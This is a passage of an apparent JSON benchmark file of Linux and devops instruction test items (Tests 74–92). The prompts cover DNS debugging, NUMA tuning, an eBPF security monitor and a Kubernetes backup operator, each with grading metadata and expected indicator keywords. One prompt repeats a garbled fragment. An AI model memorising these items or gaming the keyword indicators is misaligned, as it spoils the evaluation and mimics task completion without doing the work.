          "content": "\nCreate a comprehensive DNS infrastructure debugging toolkit:\n1. Trace DNS query path through recursive and authoritative servers\n2. Detect DNS cache poisoning attempts and validation failures\n3. Analyze DNSSEC chain of trust and signature validation\n4. Monitor DNS query patterns for DDoS and amplification attacks\n5. Debug GeoDNS and anycast routing issues\n6. Analyze DNS load balancing effectiveness\n7. Track NXDOMAIN rates and potential typosquatting\n8. Monitor zone transfer security and AXFR/IXFR issues\n9. Debug EDNS and TCP fallback problems\n10. Generate DNS infrastructure hardening recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_75",
      "name": "Test 75: Production Incident Automation",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_automation",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux automation",
      "prompt": "\nBuild an intelligent incident response automation system:\n1. Correlate alerts from multiple monitoring systems\n2. Implement intelligent alert deduplication and grouping\n3. Automatically gather diagnostic data based on alert type\n4. Execute safe automated remediation for known issues\n5. Track incident patterns and predict future occurrences\n6. Implement escalation policies with intelligent routing\n7. Generate incident timelines with automatic RCA\n8. Track MTTR and identify automation opportunities\n9. Implement chaos testing based on past incidents\n10. Generate post-incident improvement recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild an intelligent incident response automation system:\n1. Correlate alerts from multiple monitoring systems\n2. Implement intelligent alert deduplication and grouping\n3. Automatically gather diagnostic data based on alert type\n4. Execute safe automated remediation for known issues\n5. Track incident patterns and predict future occurrences\n6. Implement escalation policies with intelligent routing\n7. Generate incident timelines with automatic RCA\n8. Track MTTR and identify automation opportunities\n9. Implement chaos testing based on past incidents\n10. Generate post-incident improvement recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_76",
      "name": "Test 76: NUMA-Aware Application Tuning",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a script to optimize a memory-intensive application on a NUMA system:\n1. Detect NUMA topology using numactl and /sys/devices/system/node\n2. Analyze current memory allocation patterns via /proc/PID/numa_maps\n3. Calculate optimal CPU affinity based on memory locality\n4. Implement transparent huge pages tuning per NUMA node\n5. Set up cgroups v2 with NUMA-aware memory limits\n6. Monitor cross-NUMA memory access using perf stat\n7. Track page migration7. Track page migration statistics and costs\n8. Implement memory interleaving strategies for shared data\n9. Generate systemd service drop-in files with optimized NUMA bindings\n10. Create performance comparison report before/after optimization\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a script to optimize a memory-intensive application on a NUMA system:\n1. Detect NUMA topology using numactl and /sys/devices/system/node\n2. Analyze current memory allocation patterns via /proc/PID/numa_maps\n3. Calculate optimal CPU affinity based on memory locality\n4. Implement transparent huge pages tuning per NUMA node\n5. Set up cgroups v2 with NUMA-aware memory limits\n6. Monitor cross-NUMA memory access using perf stat\n7. Track page migration7. Track page migration statistics and costs\n8. Implement memory interleaving strategies for shared data\n9. Generate systemd service drop-in files with optimized NUMA bindings\n10. Create performance comparison report before/after optimization\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_77",
      "name": "Test 77: CPU Cache Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a CPU cache performance optimization toolkit:\n1. Analyze cache miss rates using perf stat for L1/L2/L3\n2. Identify false sharing issues using cache line analysis\n3. Optimize data structure layout for cache efficiency\n4. Implement cache coloring for reduced conflicts\n5. Monitor cache coherency traffic between cores\n6. Analyze prefetcher effectiveness and tuning\n7. Track TLB misses and huge page opportunities\n8. Implement cache-aware thread scheduling\n9. Monitor impact of CPU frequency scaling on cache\n10. Generate cache optimization recommendations with benchmarks\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a CPU cache performance optimization toolkit:\n1. Analyze cache miss rates using perf stat for L1/L2/L3\n2. Identify false sharing issues using cache line analysis\n3. Optimize data structure layout for cache efficiency\n4. Implement cache coloring for reduced conflicts\n5. Monitor cache coherency traffic between cores\n6. Analyze prefetcher effectiveness and tuning\n7. Track TLB misses and huge page opportunities\n8. Implement cache-aware thread scheduling\n9. Monitor impact of CPU frequency scaling on cache\n10. Generate cache optimization recommendations with benchmarks\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_78",
      "name": "Test 78: I/O Scheduler Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate an I/O scheduler tuning and optimization system:\n1. Analyze workload patterns (sequential vs random, read vs write)\n2. Test different schedulers (mq-deadline, bfq, kyber, none)\n3. Optimize scheduler parameters based on workload\n4. Monitor I/O latency distribution and tail latencies\n5. Implement workload-specific queue depth tuning\n6. Analyze impact of I/O scheduling on different storage types\n7. Track request merging efficiency\n8. Monitor writeback behavior and dirty page thresholds\n9. Implement cgroup-based I/O prioritization\n10. Generate I/O optimization report with benchmarks\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate an I/O scheduler tuning and optimization system:\n1. Analyze workload patterns (sequential vs random, read vs write)\n2. Test different schedulers (mq-deadline, bfq, kyber, none)\n3. Optimize scheduler parameters based on workload\n4. Monitor I/O latency distribution and tail latencies\n5. Implement workload-specific queue depth tuning\n6. Analyze impact of I/O scheduling on different storage types\n7. Track request merging efficiency\n8. Monitor writeback behavior and dirty page thresholds\n9. Implement cgroup-based I/O prioritization\n10. Generate I/O optimization report with benchmarks\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_79",
      "name": "Test 79: Network Stack Tuning",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_networking",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux networking",
      "prompt": "\nImplement comprehensive network stack optimization:\n1. Analyze network workload characteristics\n2. Optimize ring buffer sizes for packet processing\n3. Implement RSS/RPS/RFS for multi-queue NICs\n4. Tune TCP buffer sizes and congestion control\n5. Optimize interrupt coalescing parameters\n6. Implement XDP for high-performance packet processing\n7. Monitor and tune netfilter/iptables performance\n8. Optimize NUMA affinity for network interrupts\n9. Implement kernel bypass for appropriate workloads\n10. Generate network performance tuning report\n",
      "messages": [
        {
          "role": "user",
          "content": "\nImplement comprehensive network stack optimization:\n1. Analyze network workload characteristics\n2. Optimize ring buffer sizes for packet processing\n3. Implement RSS/RPS/RFS for multi-queue NICs\n4. Tune TCP buffer sizes and congestion control\n5. Optimize interrupt coalescing parameters\n6. Implement XDP for high-performance packet processing\n7. Monitor and tune netfilter/iptables performance\n8. Optimize NUMA affinity for network interrupts\n9. Implement kernel bypass for appropriate workloads\n10. Generate network performance tuning report\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_80",
      "name": "Test 80: Database Connection Pool Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_database",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux database",
      "prompt": "\nBuild a database connection pool analyzer and optimizer:\n1. Monitor connection lifecycle and usage patterns\n2. Detect connection leaks and long-running transactions\n3. Analyze wait times for connection acquisition\n4. Optimize pool size based on workload patterns\n5. Implement predictive scaling for connection pools\n6. Track connection health and automatic recovery\n7. Monitor prepared statement cache efficiency\n8. Analyze connection multiplexing opportunities\n9. Implement per-service pool isolation\n10. Generate pool configuration recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a database connection pool analyzer and optimizer:\n1. Monitor connection lifecycle and usage patterns\n2. Detect connection leaks and long-running transactions\n3. Analyze wait times for connection acquisition\n4. Optimize pool size based on workload patterns\n5. Implement predictive scaling for connection pools\n6. Track connection health and automatic recovery\n7. Monitor prepared statement cache efficiency\n8. Analyze connection multiplexing opportunities\n9. Implement per-service pool isolation\n10. Generate pool configuration recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "database",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_81",
      "name": "Test 81: Compiler Optimization Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a compiler optimization analysis toolkit:\n1. Analyze binary code generation with objdump\n2. Identify missed optimization opportunities\n3. Profile guided optimization (PGO) implementation\n4. Link time optimization (LTO) analysis\n5. Vectorization opportunity detection\n6. Function inlining analysis and tuning\n7. Branch prediction optimization\n8. Cache-aware code layout optimization\n9. Compare different compiler optimization levels\n10. Generate optimization report with performance impact\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a compiler optimization analysis toolkit:\n1. Analyze binary code generation with objdump\n2. Identify missed optimization opportunities\n3. Profile guided optimization (PGO) implementation\n4. Link time optimization (LTO) analysis\n5. Vectorization opportunity detection\n6. Function inlining analysis and tuning\n7. Branch prediction optimization\n8. Cache-aware code layout optimization\n9. Compare different compiler optimization levels\n10. Generate optimization report with performance impact\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_82",
      "name": "Test 82: Container Resource Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_monitoring",
      "reasoning_type": "multi_hop",
      "api_type": "chat",
      "description": "Instruct test case for linux monitoring",
      "prompt": "\nImplement container resource optimization system:\n1. Analyze container resource usage patterns over time\n2. Identify over-provisioned CPU/memory limits\n3. Optimize Java heap sizes within containers\n4. Implement vertical pod autoscaling recommendations\n5. Analyze container startup time optimization\n6. Optimize base image layers and caching\n7. Implement resource quota optimization\n8. Monitor and optimize init containers\n9. Analyze sidecar container overhead\n10. Generate right-sizing recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nImplement container resource optimization system:\n1. Analyze container resource usage patterns over time\n2. Identify over-provisioned CPU/memory limits\n3. Optimize Java heap sizes within containers\n4. Implement vertical pod autoscaling recommendations\n5. Analyze container startup time optimization\n6. Optimize base image layers and caching\n7. Implement resource quota optimization\n8. Monitor and optimize init containers\n9. Analyze sidecar container overhead\n10. Generate right-sizing recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "devops",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "multi_hop",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_83",
      "name": "Test 83: Storage Performance Tuning",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a comprehensive storage performance tuning system:\n1. Analyze filesystem alignment with storage geometry\n2. Optimize RAID parameters for workload\n3. Implement SSD wear leveling monitoring\n4. Tune readahead settings based on access patterns\n5. Optimize journal placement and size\n6. Implement extent allocation optimization\n7. Monitor and tune dirty page writeback\n8. Analyze and optimize snapshot overhead\n9. Implement storage tiering recommendations\n10. Generate storage optimization report\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a comprehensive storage performance tuning system:\n1. Analyze filesystem alignment with storage geometry\n2. Optimize RAID parameters for workload\n3. Implement SSD wear leveling monitoring\n4. Tune readahead settings based on access patterns\n5. Optimize journal placement and size\n6. Implement extent allocation optimization\n7. Monitor and tune dirty page writeback\n8. Analyze and optimize snapshot overhead\n9. Implement storage tiering recommendations\n10. Generate storage optimization report\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_84",
      "name": "Test 84: Power Management Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a power management optimization system:\n1. Analyze CPU frequency scaling governors\n2. Monitor C-state residency and transitions\n3. Optimize interrupt routing for power efficiency\n4. Implement workload consolidation strategies\n5. Analyze power consumption vs performance trade-offs\n6. Monitor thermal throttling impact\n7. Optimize GPU power management\n8. Implement wake-on-LAN optimization\n9. Analyze peripheral device power usage\n10. Generate power optimization recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a power management optimization system:\n1. Analyze CPU frequency scaling governors\n2. Monitor C-state residency and transitions\n3. Optimize interrupt routing for power efficiency\n4. Implement workload consolidation strategies\n5. Analyze power consumption vs performance trade-offs\n6. Monitor thermal throttling impact\n7. Optimize GPU power management\n8. Implement wake-on-LAN optimization\n9. Analyze peripheral device power usage\n10. Generate power optimization recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_85",
      "name": "Test 85: Memory Allocator Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a memory allocator analysis and optimization toolkit:\n1. Compare different allocators (glibc, jemalloc, tcmalloc)\n2. Analyze allocation patterns and fragmentation\n3. Implement arena tuning for multi-threaded apps\n4. Monitor allocation hot paths\n5. Optimize for NUMA awareness\n6. Implement custom allocation pools\n7. Analyze memory bandwidth utilization\n8. Monitor false sharing in allocations\n9. Implement allocation tracing with low overhead\n10. Generate allocator tuning recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a memory allocator analysis and optimization toolkit:\n1. Compare different allocators (glibc, jemalloc, tcmalloc)\n2. Analyze allocation patterns and fragmentation\n3. Implement arena tuning for multi-threaded apps\n4. Monitor allocation hot paths\n5. Optimize for NUMA awareness\n6. Implement custom allocation pools\n7. Analyze memory bandwidth utilization\n8. Monitor false sharing in allocations\n9. Implement allocation tracing with low overhead\n10. Generate allocator tuning recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_86",
      "name": "Test 86: Kernel Parameter Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a kernel parameter optimization system:\n1. Analyze current sysctl settings\n2. Benchmark impact of key parameters\n3. Optimize VM subsystem parameters\n4. Tune network stack sysctls\n5. Optimize scheduler parameters\n6. Implement security vs performance trade-offs\n7. Monitor parameter changes impact\n8. Create workload-specific profiles\n9. Implement automatic tuning based on workload\n10. Generate kernel tuning recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a kernel parameter optimization system:\n1. Analyze current sysctl settings\n2. Benchmark impact of key parameters\n3. Optimize VM subsystem parameters\n4. Tune network stack sysctls\n5. Optimize scheduler parameters\n6. Implement security vs performance trade-offs\n7. Monitor parameter changes impact\n8. Create workload-specific profiles\n9. Implement automatic tuning based on workload\n10. Generate kernel tuning recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_87",
      "name": "Test 87: Application Thread Pool Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a thread pool optimization system:\n1. Monitor thread pool utilization and queue depths\n2. Analyze task execution times and patterns\n3. Detect thread pool starvation\n4. Optimize pool sizes based on workload\n5. Implement work stealing optimization\n6. Monitor context switch overhead\n7. Analyze thread affinity benefits\n8. Implement dynamic pool sizing\n9. Monitor and prevent thread leaks\n10. Generate thread pool configuration recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a thread pool optimization system:\n1. Monitor thread pool utilization and queue depths\n2. Analyze task execution times and patterns\n3. Detect thread pool starvation\n4. Optimize pool sizes based on workload\n5. Implement work stealing optimization\n6. Monitor context switch overhead\n7. Analyze thread affinity benefits\n8. Implement dynamic pool sizing\n9. Monitor and prevent thread leaks\n10. Generate thread pool configuration recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_88",
      "name": "Test 88: Distributed Cache Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a distributed cache optimization toolkit:\n1. Analyze cache hit rates and miss patterns\n2. Optimize cache key distribution\n3. Implement cache warming strategies\n4. Monitor cache eviction patterns\n5. Optimize serialization overhead\n6. Implement multi-tier caching\n7. Analyze network overhead for cache operations\n8. Monitor cache coherency overhead\n9. Implement predictive cache prefetching\n10. Generate cache optimization recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a distributed cache optimization toolkit:\n1. Analyze cache hit rates and miss patterns\n2. Optimize cache key distribution\n3. Implement cache warming strategies\n4. Monitor cache eviction patterns\n5. Optimize serialization overhead\n6. Implement multi-tier caching\n7. Analyze network overhead for cache operations\n8. Monitor cache coherency overhead\n9. Implement predictive cache prefetching\n10. Generate cache optimization recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_89",
      "name": "Test 89: Load Balancer Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nImplement load balancer optimization system:\n1. Analyze request distribution patterns\n2. Optimize health check intervals and timeouts\n3. Implement least-connection vs round-robin analysis\n4. Monitor connection reuse efficiency\n5. Optimize session persistence strategies\n6. Implement geographic load balancing\n7. Analyze SSL termination overhead\n8. Monitor WebSocket connection distribution\n9. Implement circuit breaker optimization\n10. Generate load balancing recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nImplement load balancer optimization system:\n1. Analyze request distribution patterns\n2. Optimize health check intervals and timeouts\n3. Implement least-connection vs round-robin analysis\n4. Monitor connection reuse efficiency\n5. Optimize session persistence strategies\n6. Implement geographic load balancing\n7. Analyze SSL termination overhead\n8. Monitor WebSocket connection distribution\n9. Implement circuit breaker optimization\n10. Generate load balancing recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_90",
      "name": "Test 90: Query Optimizer Tuning",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a database query optimizer tuning system:\n1. Analyze query execution plans\n2. Identify missing indexes and statistics\n3. Optimize join order and methods\n4. Implement query rewriting recommendations\n5. Monitor parameter sniffing issues\n6. Analyze partition pruning effectiveness\n7. Optimize aggregate computations\n8. Implement materialized view recommendations\n9. Monitor query cache effectiveness\n10. Generate query optimization report\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a database query optimizer tuning system:\n1. Analyze query execution plans\n2. Identify missing indexes and statistics\n3. Optimize join order and methods\n4. Implement query rewriting recommendations\n5. Monitor parameter sniffing issues\n6. Analyze partition pruning effectiveness\n7. Optimize aggregate computations\n8. Implement materialized view recommendations\n9. Monitor query cache effectiveness\n10. Generate query optimization report\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_91",
      "name": "Test 91: eBPF Security Monitor",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_monitoring",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux monitoring",
      "prompt": "\nWrite a comprehensive eBPF-based security monitoring system using libbpf:\n1. Hook security_file_open to track all file access with process context\n2. Monitor privilege escalation via setuid/setgid/setcap calls\n3. Track network connections with full process attribution\n4. Detect container escapes by monitoring namespace operations\n5. Implement syscall anomaly detection using sliding window statistics\n6. Monitor kernel module operations and block unauthorized loading\n7. Track memory protection changes (mprotect, mmap with PROT_EXEC)\n8. Implement a ring buffer for high-performance event streaming\n9. Create userspace daemon for event correlation and alerting\n10. Generate security events in CEF format for SIEM integration\nProvide both the BPF C code and Python userspace component.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a comprehensive eBPF-based security monitoring system using libbpf:\n1. Hook security_file_open to track all file access with process context\n2. Monitor privilege escalation via setuid/setgid/setcap calls\n3. Track network connections with full process attribution\n4. Detect container escapes by monitoring namespace operations\n5. Implement syscall anomaly detection using sliding window statistics\n6. Monitor kernel module operations and block unauthorized loading\n7. Track memory protection changes (mprotect, mmap with PROT_EXEC)\n8. Implement a ring buffer for high-performance event streaming\n9. Create userspace daemon for event correlation and alerting\n10. Generate security events in CEF format for SIEM integration\nProvide both the BPF C code and Python userspace component.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_92",
      "name": "Test 92: Kubernetes Operator Development",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a Kubernetes operator for automated database backup management:\n1. Define CRDs for BackupPolicy and BackupJob resources\n2. Implement controller logic using controller-runtime\n3. Watch for database pods and automatically create backups\n4. Handle backup scheduling with cron expressions\n5. Implement backup retention policies\n6. Store backups in multiple backends (S3, GCS, Azure)\n7. Implement point-in-time recovery capabilities\n8. Add Prometheus metrics for backup status\n9. Implement webhook validation for CRDs\n10. Handle operator upgrades without disrupting backups\nInclude full Go code and Kubernetes manifests.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a Kubernetes operator for automated database backup management:\n1. Define CRDs for BackupPolicy and BackupJob resources\n2. Implement controller logic using controller-runtime\n3. Watch for database pods and automatically create backups\n4. Handle backup scheduling with cron expressions\n5. Implement backup retention policies\n6. Store backups in multiple backends (S3, GCS, Azure)\n7. Implement point-in-time recovery capabilities\n8. Add Prometheus metrics for backup status\n9. Implement webhook validation for CRDs\n10. Handle operator upgrades without disrupting backups\nInclude full Go code and Kubernetes manifests.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
